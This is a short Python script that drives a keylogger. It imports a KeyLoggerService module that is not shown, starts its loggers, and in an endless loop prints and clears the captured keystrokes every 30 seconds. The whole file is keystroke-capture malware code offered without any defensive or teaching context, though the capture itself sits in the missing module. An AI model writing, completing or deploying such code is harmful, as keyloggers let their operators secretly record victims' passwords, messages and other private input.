import time
from KeyLoggerService import KeyLoggerService

class KeyloggerManager:
    def __init__(self):
        self.keylogger = KeyLoggerService()

    def start(self):
        self.keylogger.startLoggers()

        while True:
            time.sleep(30)
            log_data = " ".join(self.keylogger.get_loggers())
            print(log_data)
            self.keylogger.logged_keys = []




manager = KeyloggerManager()
manager.start()
